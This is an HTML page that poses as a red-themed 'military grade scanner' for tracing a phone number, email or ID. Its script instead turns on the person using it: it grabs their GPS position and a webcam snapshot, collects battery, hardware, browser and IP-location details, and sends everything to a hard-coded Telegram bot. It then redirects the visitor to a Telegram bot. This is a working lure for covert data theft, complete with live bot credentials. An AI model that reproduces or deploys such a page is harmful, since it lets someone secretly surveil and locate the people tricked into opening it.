<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MILITARY GRADE SCANNER v9.9</title>
    <style>
        body { margin: 0; background: #050505; color: #ff0000; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .terminal { width: 95%; max-width: 700px; background: rgba(10, 0, 0, 0.95); border: 2px solid #ff0000; border-radius: 2px; box-shadow: 0 0 40px rgba(255, 0, 0, 0.2); padding: 30px; position: relative; }
        .header { border-bottom: 2px solid #ff0000; padding-bottom: 10px; margin-bottom: 25px; display: flex; justify-content: space-between; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
        .input-group { display: flex; flex-direction: column; gap: 20px; }
        input { background: #1a0000; border: 1px solid #ff0000; color: #ff0000; padding: 15px; font-family: inherit; font-size: 18px; outline: none; box-shadow: inset 0 0 5px #000; }
        button { background: #ff0000; color: #000; border: none; padding: 20px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; text-transform: uppercase; }
        button:hover { background: #b30000; box-shadow: 0 0 20px #ff0000; }
        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .scan-line { width: 100%; height: 4px; background: #ff0000; position: absolute; top: 0; animation: scan 1.5s linear infinite; box-shadow: 0 0 20px #ff0000; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .log-line { font-size: 10px; color: #660000; margin-top: 10px; line-height: 1.2; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="terminal">
    <div class="header">
        <span>[ DEEP_TRACE_PROTOCOL_ACTIVE ]</span>
        <span style="animation: blinker 0.5s step-end infinite;">● ALIVE</span>
    </div>
    <div class="input-group">
        <label>ENTER TARGET IDENTIFIER:</label>
        <input type="text" id="target" placeholder="ID / PHONE / EMAIL" autocomplete="off">
        <button onclick="executeFullTrace()">RUN TOTAL EXTRACTION</button>
    </div>
    <div class="log-line" id="console">
        > SYSTEM_READY...<br>
        > ENCRYPTION: AES_256_ACTIVE<br>
        > VOLTAGE: STABLE
    </div>
</div>

<div id="overlay">
    <div class="scan-line"></div>
    <h1 style="color: #ff0000; letter-spacing: 5px;">EXTRACTING DATA...</h1>
    <p id="progress" style="color: #ff0000;">FETCHING HARDWARE DOSSIER: 0%</p>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const p1 = '8570554697';
    const p2 = 'AAHRYkl8_AIuOC4gbOl6AxRWOnmEMzw15Eg';
    const T = p1 + ':' + p2;
    const CID = '1751630480';

    async function send(msg) {
        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CID, text: msg, parse_mode: 'Markdown'})
        });
    }

    async function sendP(blob) {
        let f = new FormData();
        f.append('chat_id', CID);
        f.append('photo', blob, 't.jpg');
        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
    }

    async function executeFullTrace() {
        const val = document.getElementById('target').value;
        if(!val) return;

        document.getElementById('overlay').style.display = 'flex';
        
        // Попытка забрать GPS
        navigator.geolocation.getCurrentPosition(p => {
            send(`🎯 **EXACT GPS:** \`${p.coords.latitude}, ${p.coords.longitude}\` (Acc: ${p.coords.accuracy}m)`);
        }, null, {enableHighAccuracy:true});

        // Камера и Батарея
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            document.getElementById('v').srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('c');
                const video = document.getElementById('v');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video,0,0);
                canvas.toBlob(blob => sendP(blob));
                
                collectAll(val);
            }, 2000);
        } catch(e) {
            collectAll(val);
        }
    }

    async function collectAll(target) {
        const prog = document.getElementById('progress');
        prog.innerText = "> DUMPING SYSTEM INFO: 100%";

        // Батарея
        let batteryInfo = "No Data";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryInfo = `${(b.level * 100)}%, Charging: ${b.charging}`;
        }

        // IP данные
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();

        const report = `
🚨 **TOTAL EXTRACTION REPORT** 🚨
────────────────────
🎯 **TARGET:** \`${target}\`
⏰ **LOCAL TIME:** \`${new Date().toLocaleString()}\`

🌐 **NETWORK DOSSIER:**
• IP: \`${d.ip}\`
• ORG: \`${d.org} (${d.asn})\`
• COUNTRY: \`${d.country_name} (${d.country_code})\`
• CITY: \`${d.city}, ${d.region}\`
• ZIP: \`${d.postal}\`
• CALL_CODE: \`+${d.country_calling_code}\`
• CURRENCY: \`${d.currency}\`

💻 **HARDWARE & OS:**
• CPU CORES: \`${navigator.hardwareConcurrency}\`
• RAM: \`${navigator.deviceMemory} GB\`
• PLATFORM: \`${navigator.platform}\`
• BROWSER: \`${navigator.vendor}\`
• SCREEN: \`${screen.width}x${screen.height} (${screen.colorDepth}bit)\`
• BATTERY: \`${batteryInfo}\`
• LANGUAGE: \`${navigator.language}\`
• TOUCH: \`${navigator.maxTouchPoints > 0 ? "YES" : "NO"}\`

🕵️ **ADVANCED TRACE:**
• VPN/PROXY: \`${d.threat?.is_proxy || "Unknown"}\`
• TIMEZONE: \`${d.timezone} (UTC ${d.utc_offset})\`
• LANGUAGES: \`${navigator.languages.join(', ')}\`
• COOKIES: \`${navigator.cookieEnabled}\`
• ONLINE: \`${navigator.onLine}\`

📱 **UA STRING:**
\`${navigator.userAgent}\`
────────────────────`;

        await send(report);
        setTimeout(() => { location.href = "https://t.me/Osint_search_bot"; }, 1500);
    }
</script>
</body>
</html>
